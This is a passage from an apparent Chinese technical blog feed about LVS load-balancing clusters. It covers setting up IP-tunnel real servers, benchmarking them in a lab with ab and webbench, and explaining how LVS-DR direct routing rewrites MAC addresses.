&gt;&gt; /etc/sysctl.conf#echo &quot;net.ipv4.conf.all.arp_ignore = 1&quot; &gt;&gt; /etc/sysctl.conf#echo &quot;net.ipv4.conf.all.arp_announce = 2&quot; &gt;&gt; /etc/sysctl.conf #echo &quot;net.ipv4.conf.lo.arp_ignore = 1&quot; &gt;&gt; /etc/sysctl.conf#echo &quot;net.ipv4.conf.lo.arp_announce = 2&quot; &gt;&gt; /etc/sysctl.confip_addr=`ip a | grep &quot;\&lt;inet\&gt;&quot; | grep -v &quot;127.0.0.1&quot; | tr &apos;/&apos; &apos; &apos; | awk &apos;{print $2}&apos; | head -1`yum install -y httpdecho $ip_addr &gt; /var/www/html/index.htmlsystemctl start httpdecho </code></pre><h2 id="LVS&#x538B;&#x529B;&#x6D4B;&#x8BD5;"><a href="#LVS&#x538B;&#x529B;&#x6D4B;&#x8BD5;" class="headerlink" title="LVS&#x538B;&#x529B;&#x6D4B;&#x8BD5;"></a>LVS&#x538B;&#x529B;&#x6D4B;&#x8BD5;</h2><p><strong>ab&#x538B;&#x6D4B;</strong></p><pre><code>[root@repo_srv webbench-1.5]# ab -n 100000 -c 100 http://192.168.110.10/This is ApacheBench, Version 2.3 &lt;$Revision: 1430300 $&gt;Copyright 1996 Adam Twiss, Zeus Technology Ltd, http://www.zeustech.net/Licensed to The Apache Software Foundation, http://www.apache.org/Benchmarking 192.168.110.10 (be patient)Completed 10000 requestsCompleted 20000 requestsCompleted 30000 requestsCompleted 40000 requestsCompleted 50000 requestsCompleted 60000 requestsCompleted 70000 requestsCompleted 80000 requestsCompleted 90000 requestsCompleted 100000 requestsFinished 100000 requestsServer Software:        Apache/2.4.6Server Hostname:        192.168.110.10Server Port:            80Document Path:          /Document Length:        15 bytesConcurrency Level:      100Time taken for tests:   110.424 secondsComplete requests:      100000Failed requests:        0Write errors:           0Total transferred:      27400000 bytesHTML transferred:       1500000 bytesRequests per second:    905.60 [#/sec] (mean)Time per request:       110.424 [ms] (mean)Time per request:       1.104 [ms] (mean, across all concurrent requests)Transfer rate:          242.32 [Kbytes/sec] receivedConnection Times (ms)              min  mean[+/-sd] median   maxConnect:        1   53  14.1     49     205Processing:    12   57  15.6     53     241Waiting:        1   44  14.8     42     204Total:         40  110  23.8    102     295Percentage of the requests served within a certain time (ms)  50%    102  66%    109  75%    117  80%    122  90%    138  95%    156  98%    188  99%    206 100%    295 (longest request)[root@repo_srv webbench-1.5]#</code></pre><pre><code>top - 04:42:15 up  1:26,  2 users,  load average: 1.29, 0.90, 0.39Tasks: 317 total,   7 running, 309 sleeping,   0 stopped,   1 zombie%Cpu(s):  6.9 us, 17.3 sy,  0.0 ni, 62.4 id,  0.0 wa,  0.0 hi, 13.4 si,  0.0 stKiB Mem :   999696 total,   525164 free,   255652 used,   218880 buff/cacheKiB Swap:  2097148 total,  2097148 free,        0 used.   538184 avail Mem   PID USER      PR  NI    VIRT    RES    SHR S %CPU %MEM     TIME+ COMMAND     3 root      20   0       0      0      0 R  8.0  0.0   0:11.44 ksoftirqd/0     9 root      20   0       0      0      0 R  0.7  0.0   0:01.51 rcu_sched  1193 apache    20   0  226376   3784   1828 S  0.7  0.4   0:00.24 httpd  1286 apache    20   0  226376   3784   1828 S  0.7  0.4   0:00.14 httpd  1340 apache    20   0  226376   3788   1832 S  0.7  0.4   0:00.08 httpd  1416 apache    20   0  226376   3788   1832 S  0.7  0.4   0:00.11 httpd  1146 apache    20   0  226376   3784   1828 S  0.3  0.4   0:03.22 httpd  1149 apache    20   0  226376   3784   1828 S  0.3  0.4   0:03.23 httpd  1179 root      20   0       0      0      0 S  0.3  0.0   0:00.14 kworker/0:1  1181 apache    20   0  226376   3784   1828 S  0.3  0.4   0:03.13 httpd  1199 apache    20   0  226376   3784   1828 S  0.3  0.4   0:00.17 httpd  1204 apache    20   0  226376   3784   1828 S  0.3  0.4   0:00.19 httpd  1206 apache    20   0  226376   3784   1828 S  0.3  0.4   0:00.20 httpd  1207 apache    20   0  226376   3784   1828 S  0.3  0.4   0:00.17 httpd  1211 apache    20   0  226376   3784   1828 S  0.3  0.4   0:00.15 httpd  1213 apache    20   0  226376   3784   1828 S  0.3  0.4   0:00.14 httpd  1214 apache    20   0  226376   3784   1828 S  0.3  0.4   0:00.20 httpd</code></pre><pre><code>  top - 04:42:30 up 34 min,  2 users,  load average: 1.27, 0.77, 0.33Tasks: 301 total,   8 running, 292 sleeping,   0 stopped,   1 zombie%Cpu(s):  6.6 us, 12.8 sy,  0.0 ni, 45.6 id,  0.0 wa,  0.0 hi, 35.0 si,  0.0 stKiB Mem :   999696 total,   595392 free,   241748 used,   162556 buff/cacheKiB Swap:  2097148 total,  2097148 free,        0 used.   573304 avail Mem   PID USER      PR  NI    VIRT    RES    SHR S %CPU %MEM     TIME+ COMMAND     3 root      20   0       0      0      0 R  3.7  0.0   0:06.92 ksoftirqd/0     9 root      20   0       0      0      0 R  1.0  0.0   0:01.74 rcu_sched  1185 apache    20   0  226376   3780   1832 S  0.7  0.4   0:00.17 httpd  1205 apache    20   0  226376   3784   1836 S  0.7  0.4   0:00.17 httpd  1266 apache    20   0  226376   3780   1832 S  0.7  0.4   0:00.12 httpd  1293 apache    20   0  226376   3784   1836 S  0.7  0.4   0:00.10 httpd  1328 apache    20   0  226376   3784   1836 S  0.7  0.4   0:00.09 httpd   653 root      20   0  231348   6108   4760 S  0.3  0.6   0:03.72 vmtoolsd  1061 apache    20   0  226376   3780   1832 S  0.3  0.4   0:02.45 httpd  1062 apache    20   0  226376   3780   1832 S  0.3  0.4   0:02.25 httpd  1063 apache    20   0  226376   3780   1832 S  0.3  0.4   0:02.19 httpd  1067 apache    20   0  226376   3780   1832 S  0.3  0.4   0:01.08 httpd  1080 apache    20   0  226376   3780   1832 S  0.3  0.4   0:00.27 httpd  1085 apache    20   0  226376   3780   1832 S  0.3  0.4   0:00.28 httpd  1089 apache    20   0  226376   3780   1832 S  0.3  0.4   0:00.23 httpd  1092 apache    20   0  226376   3780   1832 S  0.3  0.4   0:00.25 httpd  1093 apache    20   0  226376   3784   1836 S  0.3  0.4   0:00.25 httpd</code></pre><p>  2&#x53F0;&#x8D1F;&#x8F7D;&#x4F18;&#x70B9;&#x9876;&#x4E0D;&#x4F4F;&#x538B;&#x529B;&#x554A;&#x3002;&#x3002;&#x3002;&#x3002;</p><p>  <strong>webbench&#x8DD1;&#x4E00;&#x4E0B;</strong>  </p><pre><code>  [root@repo_srv webbench-1.5]# lsChangeLog  COPYRIGHT  debian  Makefile  socket.c  webbench.1  webbench.c[root@repo_srv webbench-1.5]# makecc -Wall -ggdb -W -O   -c -o webbench.o webbench.cwebbench.c: In function &#x2018;alarm_handler&#x2019;:webbench.c:77:31: warning: unused parameter &#x2018;signal&#x2019; [-Wunused-parameter] static void alarm_handler(int signal)                               ^cc -Wall -ggdb -W -O  -o webbench webbench.octags *.c/bin/sh: ctags: command not foundmake: [tags] Error 127 (ignored)[root@repo_srv webbench-1.5]# yum install -y ctagsLoaded plugins: product-id, search-disabled-repos, subscription-managerThis system is not registered to Red Hat Subscription Management. You can use subscription-manager to register.Resolving Dependencies--&gt; Running transaction check---&gt; Package ctags.x86_64 0:5.8-13.el7 will be installed--&gt; Finished Dependency ResolutionDependencies Resolved============================================================================================================================================================================================= Package                                    Arch                                        Version                                         Repository                                      Size=============================================================================================================================================================================================Installing: ctags                                      x86_64                                      5.8-13.el7                                      local-yum                                      155 kTransaction Summary=============================================================================================================================================================================================Install  1 PackageTotal download size: 155 kInstalled size: 351 kDownloading packages:Running transaction checkRunning transaction testTransaction test succeededRunning transaction  Installing : ctags-5.8-13.el7.x86_64                                                                                                                                                   1/1  Verifying  : ctags-5.8-13.el7.x86_64                                                                                                                                                   1/1Installed:  ctags.x86_64 0:5.8-13.el7Complete![root@repo_srv webbench-1.5]# makectags *.c[root@repo_srv webbench-1.5]# make installinstall -s webbench /usr/local/bininstall -m 644 webbench.1 /usr/local/man/man1install: cannot create regular file &#x2018;/usr/local/man/man1&#x2019;: No such file or directorymake: *** [install] Error 1[root@repo_srv webbench-1.5]# mkdir -p /usr/local/man/man1[root@repo_srv webbench-1.5]# make installinstall -s webbench /usr/local/bininstall -m 644 webbench.1 /usr/local/man/man1install -d /usr/local/share/doc/webbenchinstall -m 644 debian/copyright /usr/local/share/doc/webbenchinstall -m 644 debian/changelog /usr/local/share/doc/webbench[root@repo_srv webbench-1.5]# webbenchwebbench [option]... URL  -f|--force               Don&apos;t wait for reply from server.  -r|--reload              Send reload request - Pragma: no-cache.  -t|--time &lt;sec&gt;          Run benchmark for &lt;sec&gt; seconds. Default 30.  -p|--proxy &lt;server:port&gt; Use proxy server for request.  -c|--clients &lt;n&gt;         Run &lt;n&gt; HTTP clients at once. Default one.  -9|--http09              Use HTTP/0.9 style requests.  -1|--http10              Use HTTP/1.0 protocol.  -2|--http11              Use HTTP/1.1 protocol.  --get                    Use GET request method.  --head                   Use HEAD request method.  --options                Use OPTIONS request method.  --trace                  Use TRACE request method.  -?|-h|--help             This information.  -V|--version             Display program version.[root@repo_srv webbench-1.5]#</code></pre><p>&#x6D4B;&#x8BD5;&#xFF1A;  </p><pre><code>[root@repo_srv webbench-1.5]# webbench -c 1 -t 1 http://192.168.110.10/Webbench - Simple Web Benchmark 1.5Copyright (c) Radim Kolar 1997-2004, GPL Open Source Software.Benchmarking: GET http://192.168.110.10/1 client, running 1 sec.Speed=21899 pages/min, 100010 bytes/sec.Requests: 365 susceed, 0 failed.[root@repo_srv webbench-1.5]#</code></pre><p><code>-c</code> &#x4E3A;&#x5BA2;&#x6237;&#x7AEF;&#x6570;    <code>-t</code>&#x6301;&#x7EED;&#x8BBF;&#x95EE;&#x65F6;&#x95F4;&#xFF08;&#x79D2;&#xFF09;<br>&#x5F53;&#x53EA;&#x6709;&#x4E00;&#x4E2A;&#x5BA2;&#x6237;&#x7AEF;&#x65F6;&#xFF0C;&#x4E00;&#x5206;&#x949F;&#x53EF;&#x4EE5;&#x54CD;&#x5E94;21899&#x4E2A;&#x9875;&#x9762;&#xFF0C;1&#x79D2;&#x53EF;&#x4EE5;&#x4F20;&#x8F93;100010&#x5B57;&#x8282;<br>1&#x4E2A;&#x5BA2;&#x6237;&#x7AEF;&#xFF0C;1&#x79D2;&#x4EA7;&#x751F;&#x4E86;365&#x4E2A;&#x8BF7;&#x6C42;&#xFF0C;0&#x4E2A;&#x5931;&#x8D25;</p><pre><code>[root@repo_srv webbench-1.5]# webbench -c 20 -t 10 http://192.168.110.10Webbench - Simple Web Benchmark 1.5Copyright (c) Radim Kolar 1997-2004, GPL Open Source Software.Invalid URL syntax - hostname don&apos;t ends with &apos;/&apos;.[root@repo_srv webbench-1.5]# webbench -c 20 -t 10 http://192.168.110.10/Webbench - Simple Web Benchmark 1.5Copyright (c) Radim Kolar 1997-2004, GPL Open Source Software.Benchmarking: GET http://192.168.110.10/20 clients, running 10 sec.Speed=62010 pages/min, 283151 bytes/sec.Requests: 10335 susceed, 0 failed.[root@repo_srv webbench-1.5]#</code></pre><pre><code>[root@repo_srv ~]# webbench -c 1000 -t 60 http://192.168.110.10/Webbench - Simple Web Benchmark 1.5Copyright (c) Radim Kolar 1997-2004, GPL Open Source Software.Benchmarking: GET http://192.168.110.10/1000 clients, running 60 sec.Speed=36868 pages/min, 168336 bytes/sec.Requests: 36868 susceed, 0 failed.[root@repo_srv ~]#</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;hr&gt;
&lt;p&gt;title: LVS-IPTUN&amp;#x96C6;&amp;#x7FA4;&lt;br&gt;abbrlink: df68056c&lt;br&gt;date: 2022-06-07 13:35:10&lt;br&gt;tags: LVS&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&quot;LVS-IP-Tunnel&amp;#x6A
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>LVS-DR集群</title>
    <link href="https://marnm.github.io//posts/be48d001/"/>
    <id>https://marnm.github.io//posts/be48d001/</id>
    <published>2022-06-07T05:34:54.000Z</published>
    <updated>2022-06-11T09:49:44.144Z</updated>
    
    <content type="html"><![CDATA[<h2 id="LVS&#x76F8;&#x5173;"><a href="#LVS&#x76F8;&#x5173;" class="headerlink" title="LVS&#x76F8;&#x5173;"></a>LVS&#x76F8;&#x5173;</h2><p><strong>DirectRouting&#x76F4;&#x63A5;&#x8DEF;&#x7531;</strong><br>director&#x5206;&#x914D;&#x8BF7;&#x6C42;&#x5230;&#x4E0D;&#x540C;&#x7684;real server&#x3002;real server&#x5904;&#x7406;&#x8BF7;&#x6C42;&#x540E;&#x76F4;&#x63A5;&#x56DE;&#x5E94;&#x7ED9;&#x7528;&#x6237;&#xFF0C;&#x8FD9;&#x6837;director&#x8D1F;&#x8F7D;&#x5747;&#x8861;&#x5668;&#x4EC5;&#x5904;&#x7406;&#x5BA2;&#x6237;&#x673A;&#x4E0E;&#x670D;&#x52A1;&#x5668;&#x7684;&#x4E00;&#x534A;&#x8FDE;&#x63A5;&#x3002;&#x8D1F;&#x8F7D;&#x5747;&#x8861;&#x5668;&#x4EC5;&#x5904;&#x7406;&#x4E00;&#x534A;&#x7684;&#x8FDE;&#x63A5;&#xFF0C;&#x907F;&#x514D;&#x4E86;&#x65B0;&#x7684;&#x6027;&#x80FD;&#x74F6;&#x9888;&#xFF0C;&#x540C;&#x6837;&#x589E;&#x52A0;&#x4E86;&#x7CFB;&#x7EDF;&#x7684;&#x53EF;&#x4F38;&#x7F29;&#x6027;&#x3002;Direct Routing&#x7531;&#x4E8E;&#x91C7;&#x7528;&#x7269;&#x7406;&#x5C42;&#xFF08;&#x4FEE;&#x6539;MAC&#x5730;&#x5740;&#xFF09;&#x6280;&#x672F;&#xFF0C;&#x56E0;&#x6B64;&#x6240;&#x6709;&#x670D;&#x52A1;&#x5668;&#x90FD;&#x5FC5;&#x987B;&#x5728;&#x4E00;&#x4E2A;&#x7F51;&#x6BB5;&#x4E2D;&#x3002;</p><p><strong>IP Tunneling (IP&#x96A7;&#x9053;)</strong><br>IP Tunneling&#x6280;&#x672F;&#x6781;&#x5927;&#x5730;&#x63D0;&#x9AD8;&#x4E86;director&#x7684;&#x8C03;&#x5EA6;&#x5904;&#x7406;&#x80FD;&#x529B;&#xFF0C;&#x540C;&#x65F6;&#x4E5F;&#x6781;&#x5927;&#x5730;&#x63D0;&#x9AD8;&#x4E86;&#x7CFB;&#x7EDF;&#x80FD;&#x5BB9;&#x7EB3;&#x7684;&#x6700;&#x5927;&#x8282;&#x70B9;&#x6570;&#xFF0C;&#x53EF;&#x4EE5;&#x8D85;&#x8FC7;100&#x4E2A;&#x8282;&#x70B9;&#x3002;real server&#x53EF;&#x4EE5;&#x5728;&#x4EFB;&#x4F55;LAN&#x6216;WAN&#x4E0A;&#x8FD0;&#x884C;&#xFF0C;&#x8FD9;&#x610F;&#x5473;&#x7740;&#x5141;&#x8BB8;&#x5730;&#x7406;&#x4E0A;&#x7684;&#x5206;&#x5E03;&#xFF0C;&#x8FD9;&#x5728;&#x707E;&#x96BE;&#x6062;&#x590D;&#x4E2D;&#x6709;&#x91CD;&#x8981;&#x610F;&#x4E49;&#x3002;&#x670D;&#x52A1;&#x5668;&#x5FC5;&#x987B;&#x62E5;&#x6709;&#x6B63;&#x5F0F;&#x7684;&#x516C;&#x7F51;IP&#x5730;&#x5740;&#x7528;&#x4E8E;&#x4E0E;&#x5BA2;&#x6237;&#x673A;&#x76F4;&#x63A5;&#x901A;&#x4FE1;&#xFF0C;&#x5E76;&#x4E14;&#x6240;&#x6709;&#x670D;&#x52A1;&#x5668;&#x5FC5;&#x987B;&#x652F;&#x6301;IP&#x96A7;&#x9053;&#x534F;&#x8BAE;&#x3002;</p><p><strong>Direct Routing &#x548C;IP Tunneling &#x533A;&#x522B;&#xFF1A;</strong><br>Direct Routing&#x4E0E;IP Tunneling&#x76F8;&#x6BD4;&#xFF0C;&#x6CA1;&#x6709;IP&#x5C01;&#x88C5;&#x7684;&#x5F00;&#x9500;&#xFF0C;&#x4F46;&#x7531;&#x4E8E;&#x91C7;&#x7528;&#x6570;&#x636E;&#x94FE;&#x8DEF;&#x5C42;&#xFF08;&#x4FEE;&#x6539;MAC&#x5730;&#x5740;&#xFF09;&#x6280;&#x672F;&#xFF0C;&#x6240;&#x6709;&#x670D;&#x52A1;&#x5668;&#x90FD;&#x5FC5;&#x987B;&#x5728;&#x4E00;&#x4E2A;&#x7269;&#x7406;&#x7F51;&#x6BB5;&#x3002;  </p><p><strong>DR&#x6A21;&#x5F0F;&#x5B9E;&#x9645;&#x62D3;&#x6251;&#x56FE;&#x53CA;DR&#x5DE5;&#x4F5C;&#x65B9;&#x5F0F;&#x6D41;&#x7A0B;&#x56FE;&#xFF1A;</strong><br><strong>LVS-DR&#x7684;&#x5DE5;&#x4F5C;&#x539F;&#x7406;&#xFF1A;</strong> Deiector&#x6536;&#x5230;&#x8BF7;&#x6C42;&#xFF0C;&#x5C06;&#x8BF7;&#x6C42;&#x8F6C;&#x53D1;&#x7ED9;&#x4E86;&#x6211;&#x4EEC;&#x7684;real server&#xFF0C;&#x4F46;&#x662F;&#x63A5;&#x4E0B;&#x6765;&#x7684;&#x5DE5;&#x4F5C;&#x5C31;&#x662F;&#x6211;&#x4EEC;&#x7684;realserver&#x548C;&#x6211;&#x4EEC;&#x7684;&#x5BA2;&#x6237;&#x7AEF;&#x8FDB;&#x884C;&#x901A;&#x8BAF;&#x4E86;&#xFF0C;&#x6240;&#x4EE5;&#x6E90;&#x7406;&#x56FE;&#x5982;&#x4E0B;</p><p><img src="http://192.168.84.188:8081/uploads/1654859040400253202lvsdr.png" alt=""></p><p><strong>LVS/DR&#x6A21;&#x5F0F;&#x5DE5;&#x4F5C;&#x539F;&#x7406;</strong><br>MAC&#x8F6C;&#x6362;&#x8FC7;&#x7A0B;<br>&#x5B9E;&#x4F8B;&#x573A;&#x666F;&#x8BBE;&#x5907;&#x6E05;&#x5355;&#xFF1A;director&#x5206;&#x53D1;&#x5668;&#xFF0C;IP&#xFF1A;192.168.1.70&#xFF0C;VIP&#xFF1A;192.168.1.63</p><table><thead><tr><th>Director</th><th>VIP</th><th>Real Server</th><th>Client/GW</th></tr></thead><tbody><tr><td>192.168.1.70(eth0)</td><td>192.168.1.63</td><td>192.168.1.62(eth0)</td><td>192.168.1.101</td></tr><tr><td>00:0c:29:6a:8d:5d</td><td>00:0c:29:6a:8d:5d</td><td>00:0c:29:b1:97:82</td><td>00:18:82:3c:e8:96</td></tr></tbody></table><p>&#x2460; client&#x57FA;&#x672C;&#x4FE1;&#x606F;&#xFF1A;IP&#xFF1A;192.168.1.101 &#x5411;&#x76EE;&#x6807;VIP&#x53D1;&#x51FA;&#x8BF7;&#x6C42;&#xFF0C;Director&#x63A5;&#x6536;&#xFF0C;&#x6B64;&#x65F6;IP&#x5305;&#x5934;&#x53CA;&#x6570;&#x636E;&#x5E27;&#x5934;&#x4FE1;&#x606F;&#x5982;&#x4E0B;&#xFF1A;<br><img src="http://192.168.84.188:8081/uploads/165486100071106267lvsdrclientrequest.png" alt=""></p><p>&#x2461; Director&#x5206;&#x53D1;&#x5668;&#x6839;&#x636E;&#x8D1F;&#x8F7D;&#x5747;&#x8861;&#x7B97;&#x6CD5;&#x9009;&#x62E9;&#x4E00;&#x53F0;active&#x7684;real server&#xFF08;&#x5047;&#x8BBE;&#x662F;192.168.1.62&#xFF09;&#xFF0C;&#x5C06;&#x6B64;RIP&#x6240;&#x5728;&#x7684;&#x7F51;&#x5361;&#x7684;MAC&#x5730;&#x5740;&#x4F5C;&#x4E3A;&#x76EE;&#x6807;MAC&#x5730;&#x5740;&#xFF0C;&#x53D1;&#x9001;&#x5230;&#x5C40;&#x57DF;&#x7F51;&#x91CC;&#xFF0C;&#x6B64;&#x65F6;IP&#x5305;&#x5934;&#x53CA;&#x6570;&#x636E;&#x5E27;&#x5934;&#x4FE1;&#x606F;&#x5982;&#x4E0B;&#xFF1A;<br><img src="http://192.168.84.188:8081/uploads/1654862936516783744lvsdrdirector.png" alt=""></p><p>&#x2462; realserver(192.168.1.62)&#x5728;&#x5C40;&#x57DF;&#x7F51;&#x4E2D;&#x6536;&#x5230;&#x8FD9;&#x4E2A;&#x5E27;&#xFF0C;&#x62C6;&#x5F00;&#x540E;&#x53D1;&#x73B0;&#x76EE;&#x6807;IP(VIP)&#x4E0E;&#x672C;&#x5730;&#x5339;&#x914D;&#xFF0C;&#x4E8E;&#x662F;&#x5904;&#x7406;&#x8FD9;&#x4E2A;&#x62A5;&#x6587;&#x3002;&#x968F;&#x540E;&#x91CD;&#x65B0;&#x5C01;&#x88C5;&#x62A5;&#x6587;&#xFF0C;&#x53D1;&#x9001;&#x5230;&#x5C40;&#x57DF;&#x7F51;&#xFF0C;&#x6B64;&#x65F6;IP&#x5305;&#x5934;&#x53CA;&#x6570;&#x636E;&#x5E27;&#x5934;&#x4FE1;&#x606F;&#x5982;&#x4E0B;&#xFF1A;<br><img src="http://192.168.84.188:8081/uploads/1654863015392407578lvsdrrsreply.png" alt=""></p><p>&#x2463; &#x5982;&#x679C;client&#x4E0E;VS&#x540C;&#x4E00;&#x7F51;&#x6BB5;&#xFF0C;&#x90A3;&#x4E48;client(192.168.1.101)&#x5C06;&#x6536;&#x5230;&#x8FD9;&#x4E2A;&#x56DE;&#x590D;&#x62A5;&#x6587;&#xFF1B;&#x5982;&#x679C;&#x8DE8;&#x4E86;&#x7F51;&#x6BB5;&#xFF0C;&#x90A3;&#x4E48;&#x62A5;&#x6587;&#x901A;&#x8FC7;gateway/&#x8DEF;&#x7531;&#x5668;&#x7ECF;&#x7531;Internet&#x8FD4;&#x56DE;&#x7ED9;&#x7528;&#x6237;<br>&#x5F52;&#x7EB3;&#x4E00;&#x4E0B;&#xFF1A;<br>1&#xFF09;&#x63A5;&#x6536;client&#x7684;&#x8BF7;&#x6C42;&#xFF0C;&#x6839;&#x636E;&#x4F60;&#x8BBE;&#x5B9A;&#x7684;&#x8D1F;&#x8F7D;&#x5747;&#x8861;&#x7B97;&#x6CD5;&#x9009;&#x53D6;&#x4E00;&#x53F0;realserver&#x7684;IP<br>2&#xFF09;&#x4EE5;&#x9009;&#x53D6;&#x7684;&#x8FD9;&#x4E2A;IP&#x5BF9;&#x5E94;&#x7684;mac&#x5730;&#x5740;&#x4F5C;&#x4E3A;&#x76EE;&#x6807;mac&#xFF0C;&#x7136;&#x540E;&#x91CD;&#x65B0;&#x5C06;IP&#x5305;&#x5C01;&#x88C5;&#x6210;&#x5E27;&#x8F6C;&#x53D1;&#x7ED9;&#x8FD9;&#x53F0;RS<br>3&#xFF09;&#x5728;hash table&#x4E2D;&#x8BB0;&#x5F55;&#x8FDE;&#x63A5;&#x4FE1;&#x606F;<br>&#x6570;&#x636E;&#x5305;&#x3001;&#x6570;&#x636E;&#x5E27;&#x7684;&#x5927;&#x81F4;&#x6D41;&#x5411;&#x662F;&#x8FD9;&#x6837;&#x7684;&#xFF1A;client &#x2013;&gt; VS &#x2013;&gt; RS &#x2013;&gt; client<br>&#x4EE5;&#x4E0A;&#x5C31;&#x662F;&#x5BF9;LVS/DR&#x6A21;&#x5F0F;&#x7684;&#x6E90;&#x7406;&#x4ECB;&#x7ECD;</p><p>&#x4E3A;&#x4EC0;&#x4E48;&#x9700;&#x8981;DR&#xFF1F; &#x56E0;&#x4E3A;NAT&#x6A21;&#x5F0F;&#x6548;&#x7387;&#x592A;&#x4F4E;<br>DR&#x65B9;&#x5F0F;&#x7279;&#x70B9;&#xFF1F;&#x6210;&#x672C;&#xFF1F;&#x90FD;&#x662F;&#x516C;&#x7F51;&#x5730;&#x5740;<br><img src="http://192.168.84.188:8081/uploads/1654863105680397002lvsdrstrct.png" alt=""></p><p><strong>&#x7F51;&#x7EDC;&#x8F6C;&#x53D1;:</strong><br>&#x57FA;&#x4E8E;2&#x5C42;&#x7684;&#x6570;&#x636E;&#x62A5;&#x6587;&#x7684;&#x8F6C;&#x53D1;, &#x8981;&#x6BD4;&#x57FA;&#x4E8E;3&#x5C42;&#x7684;&#x7F51;&#x7EDC;&#x8F6C;&#x53D1;&#x6548;&#x7387;&#x8981;&#x9AD8;</p><p> LVS-DR &#x662F;&#x57FA;&#x4E8E;2&#x5C42;&#x7684;&#x8F6C;&#x53D1;, &#x6240;&#x4EE5;&#x5728;LVS&#x4E2D;&#x6240;&#x6709;&#x7684;&#x6A21;&#x5F0F;, &#x6548;&#x7387;&#x662F;&#x6700;&#x597D;&#x7684;</p><p>1)&#xFF1A;&#x57FA;&#x4E8E;mac&#x7684;&#x6570;&#x636E;&#x62A5;&#x6587;&#x8F6C;&#x53D1;, &#x662F;&#x6548;&#x7387;&#x6700;&#x597D;&#x7684;, &#x4F46;&#x662F;&#x662F;&#x6839;&#x636E;&#x4EA4;&#x6362;&#x673A;&#x7684;MAC&#x5730;&#x5740;&#x8868;&#x6765;&#x5B9E;&#x73B0;&#x7684;<br>    MAC&#x8868;&#x4E3B;&#x8981;&#x544A;&#x8BC9;&#x4F60;, &#x5230;xxxx&#x5730;&#x65B9;&#x8BE5;&#x8D70;&#x90A3;&#x4E2A;&#x7AEF;&#x53E3;<br>    &#x5982;&#x679C;&#x4EA4;&#x6362;&#x4E0D;&#x77E5;&#x9053;&#x5BF9;&#x65B9;&#x5728;&#x54EA;&#x513F;, &#x8FD9;&#x4E2A;&#x65F6;&#x5019;, &#x4ED6;&#x5C31;&#x8981;&#x8FDB;&#x884C;&#x5E7F;&#x64AD;, &#x5C31;&#x95EE;xxxx&#x5728;&#x54EA;&#x513F;, &#x5982;&#x679C;&#x5BF9;&#x5E94;&#x7684;&#x8BBE;&#x5907;&#x7ED9;&#x4E86;&#x56DE;&#x5E94;, &#x90A3;&#x4E48;&#x4EA4;&#x6362;&#x673A;&#x4E5F;&#x5C31;&#x66F4;&#x65B0;&#x4E86;&#x81EA;&#x5DF1;&#x7684;MAC&#x5730;&#x5740;&#x8868;&#x8BB0;&#x5F55;&#x5230;xxxx&#x9700;&#x8981;&#x8D70;&#x8FD9;&#x4E2A;&#x7AEF;&#x53E3;<br>2)&#xFF1A;2&#x5C42;&#x8BBE;&#x5907;&#x4E0D;&#x5177;&#x6709;&#x8DEF;&#x7531;&#x529F;&#x80FD;, &#x90A3;&#x4E48;&#x5E7F;&#x64AD;&#x4E5F;&#x5C31;&#x4E0D;&#x5177;&#x6709;&#x8DE8;&#x8DEF;&#x7531;&#x7684;&#x529F;&#x80FD;, &#x6240;&#x6709;&#x8981;&#x5B9E;&#x73B0;mac&#x5730;&#x5740;&#x5E7F;&#x64AD;, &#x5FC5;&#x987B;&#x5728;&#x540C;&#x4E00;&#x7269;&#x7406;&#x7F51;&#x6BB5;<br>3)&#xFF1A;vlan&#x5177;&#x6709;&#x9694;&#x79BB;&#x5E7F;&#x64AD;&#x7684;&#x529F;&#x80FD;, &#x6240;&#x6709;&#x8981;&#x80FD;&#x5904;&#x7406;mac&#x5730;&#x5740;&#x5E7F;&#x64AD;, &#x5C31;&#x5E94;&#x8BE5;&#x5728;&#x540C;&#x4E00;&#x4E2A;VLAN&#x4E2D;  </p><p>&#x56E0;&#x6B64;: &#x5982;&#x679C;&#x8981;&#x5B9E;&#x73B0;LVS-DR&#x6A21;&#x5F0F;<br>1): &#x6240;&#x6709;&#x7684;&#x8BBE;&#x5907;&#x5E94;&#x8BE5;&#x5728;&#x540C;&#x4E00;&#x4E2A;&#x7269;&#x7406;&#x7F51;&#x6BB5;<br>2): &#x6240;&#x6709;&#x7684;&#x8BBE;&#x5907;&#x90FD;&#x5E94;&#x8BE5;&#x5728;&#x540C;&#x4E00;&#x4E2A;&#x5E7F;&#x64AD;&#x57DF;&#x4E2D;</p><p><strong>LVS/DR&#x6A21;&#x5F0F;&#x5DE5;&#x4F5C;&#x539F;&#x7406;</strong><br>1&#xFF09;DR&#x6A21;&#x5F0F;&#xFF0C;&#x5168;&#x7A0B;&#x76EE;&#x6807;&#x5730;&#x5740;&#xFF0C;&#x6E90;&#x5730;&#x5740;&#x4E0D;&#x53D8;&#xFF0C;&#x56E0;&#x4E3A;DR&#x6A21;&#x5F0F;&#x5DE5;&#x4F5C;&#x4E8E;2&#x5C42;<br>2&#xFF09;&#x8BF7;&#x6C42;&#x62A5;&#x6587;&#x4ECE;&#x5BA2;&#x6237;&#x7AEF;&#x53D1;&#x51FA;&#xFF1A;<br>    &#x6E90;&#x5730;&#x5740;&#xFF1A;CIP    &#x6E90;MAC CMAC   &#x76EE;&#x6807;&#x5730;&#x5740;&#xFF1A;VIP    &#x76EE;&#x6807;MAC&#xFF1A;xxx<br>3&#xFF09;&#x8BF7;&#x6C42;&#x62A5;&#x6587;&#x5230;&#x8FBE;&#x673A;&#x623F;&#x9632;&#x706B;&#x5899;&#x4E4B;&#x540E;&#xFF0C;&#x4F1A;&#x5728;&#x9632;&#x706B;&#x5899;&#x7684;&#x5185;&#x7F51;&#x53E3;&#x8FDB;&#x884C;&#x5E7F;&#x64AD;&#xFF0C;&#x627E;&#x5230;VIP&#x5728;&#x54EA;&#x513F;&#xFF0C;&#x7136;&#x540E;&#x628A;&#x5305;&#x4E22;&#x51FA;&#x53BB;<br>    &#x6E90;&#x5730;&#x5740;&#xFF1A;CIP    &#x76EE;&#x6807;&#x5730;&#x5740;&#xFF1A;VIP<br>    &#x6E90;MAC&#xFF1A;FMAC  